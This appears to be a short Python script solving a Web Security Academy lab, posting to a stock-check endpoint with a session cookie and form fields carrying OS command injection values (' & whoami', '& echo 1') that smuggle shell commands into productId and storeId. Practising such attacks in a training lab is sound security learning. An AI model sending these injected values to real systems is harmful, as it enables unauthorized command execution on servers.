import requests


lab_url = "https://0ab900b5035d044b8146445900960026.web-security-academy.net/product/stock"
cookies = {"session": "WL1gJbuy3nKnlZ2pJpVTEAoOUxpZYGfD"}
headers = {'Content-type': 'application/x-www-form-urlencoded'}

data = {
    "productId": " & whoami",
    "storeId": "& echo 1"
}


response = requests.post(url=lab_url, headers=headers, cookies=cookies, data=data)

print(response.text)